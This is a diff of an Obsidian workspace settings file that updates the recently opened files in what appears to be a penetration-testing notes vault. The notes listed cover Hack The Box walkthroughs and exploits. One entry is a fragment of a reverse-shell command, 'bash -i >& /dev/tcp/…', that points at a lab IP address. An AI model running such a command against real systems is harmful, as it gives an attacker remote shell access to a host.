@@ -214,10 +214,12 @@
       "obsidian-excalidraw-plugin:Create new drawing": false
     }
   },
-  "active": "aa8f743586e9077b",
+  "active": "76cffbefb3737f65",
   "lastOpenFiles": [
-    "images/Pasted.md",
+    "images/Pasted Image 20230525055644_920.png",
     "walkthrough/HTB_blackfeild.md",
+    "images/Pasted.md",
+    "images/Pasted image 20230501220803.png",
     "HTB/Excalidraw/msfvenom.md",
     "HTB/Excalidraw/MS08_067_2018.py.md",
     "HTB/Excalidraw/MS-17-010.md",
@@ -232,7 +234,6 @@
     "images/Pasted image 20230908211122.png",
     "images/Pasted image 20230908210514.png",
     "images/Pasted image 20230908210045.png",
-    "images/Pasted image 20230908205727.png",
     "images",
     "Watson.md",
     "drupalgeddon3.py.md",
@@ -252,7 +253,6 @@
     "keepass.md",
     "ImageMagick.md",
     "git-dumper.md",
-    "CVE-2023-32784.md",
     "walkthrough",
     "pix",
     "bash -i >& /dev/tcp/10.10.16.28",
